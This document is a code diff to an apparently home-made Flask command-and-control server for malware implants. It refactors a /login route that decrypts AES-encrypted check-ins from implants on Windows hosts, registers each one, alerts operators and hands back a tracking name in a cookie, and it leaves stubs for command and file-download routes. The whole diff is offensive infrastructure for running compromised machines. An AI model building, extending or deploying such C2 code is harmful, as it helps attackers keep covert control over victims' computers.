@@ -7,7 +7,6 @@ from flask import Flask, request, make_response, jsonify
 from werkzeug.utils import secure_filename
 from typing import Dict
 import random
-import json
 import requests
 
 # Constants, to be changed via config file or command line params later
@@ -68,14 +67,8 @@ def build_operator_update(update_type: server_codes.ServerUpdates, data) -> Dict
         case _:
             return {}
 
-
-
 ### Start the routing ###
-# DEBUG page
-@app.route("/admin/debug")
-def debug():
 
-    return "debuggy"
 # Default dummy page
 @app.route("/", methods=['GET'])
 def under_construction():
@@ -84,44 +77,44 @@ def under_construction():
 # The login route for implants
 @app.route("/login", methods=['POST'])
 def implant_register():
-    #try:
-    # Read in Base64 post data
-    aes_data = request.get_data()
+    try:
+        # Read in Base64 post data
+        aes_data = request.get_data()
 
-    # Decrypt it
-    data = AES_INSTANCE.decrypt(aes_data)
-    
-    # Extract the major windows version and the build number
-    major_v = data.split(":::")[0]
-    build_num = data.split(":::")[1]
-    sleep_time = data.split(":::")[2]
+        # Decrypt it
+        data = AES_INSTANCE.decrypt(aes_data)
+        
+        # Extract the major windows version and the build number
+        major_v = data.split(":::")[0]
+        build_num = data.split(":::")[1]
+        sleep_time = data.split(":::")[2]
 
-    print(data)
+        print(data)
 
-    # Generate a name
-    new_implant_name = encryption.id_generator(N=4)
+        # Generate a name
+        new_implant_name = encryption.id_generator(N=4)
 
-    # Add the new implant to the implant_db
-    implant_db.add_implant(storage.Implant(name=new_implant_name,
-                                           major_v=major_v,
-                                           build_num=build_num,
-                                           sleep_time=sleep_time
-                                          ))
+        # Add the new implant to the implant_db
+        implant_db.add_implant(storage.Implant(name=new_implant_name,
+                                               major_v=major_v,
+                                               build_num=build_num,
+                                               sleep_time=sleep_time
+                                              ))
 
-    # Update the operators
-    update_operators(server_codes.ServerUpdates.NEW_IMPLANT, implant_db.dict[new_implant_name])
-    print(f"A new implant has connected: {new_implant_name}")
+        # Update the operators
+        update_operators(server_codes.ServerUpdates.NEW_IMPLANT, implant_db.dict[new_implant_name])
+        print(f"A new implant has connected: {new_implant_name}")
 
-    # Set the first contact time
-    implant_db.dict[new_implant_name].last_checkin = datetime.now()
+        # Set the first contact time
+        implant_db.dict[new_implant_name].last_checkin = datetime.now()
 
-    # Respond with the new name as a Cookie header and random text
-    response = make_response(encryption.id_generator(random.randint(200,350)))
-    response.headers["Cookie"] = new_implant_name
-    return response
-    #except:
-        #print("An implant tried to log in but the /login endpoint error'ed")
-        #return "ayooo there was an error my guy"
+        # Respond with the new name as a Cookie header and random text
+        response = make_response(encryption.id_generator(random.randint(200,350)))
+        response.headers["Cookie"] = new_implant_name
+        return response
+    except:
+        print("An implant tried to log in but the /login endpoint error'ed")
+        return server_codes.ServerErrors.ERR_IMPLANT_LOGIN_EXCEPTION.value
 
 # The command recieve route for implants
 @app.route("/recipes")
@@ -129,8 +122,8 @@ def implant_command():
     return "TODO"
 
 # The file download route for implants
-@app.route("/recipes/download/<ID>")
-def implant_download():
+@app.route("/recipes/download/<FILE_ID>")
+def implant_download(FILE_ID):
     return "TODO"
 
 # The response route for output from implants
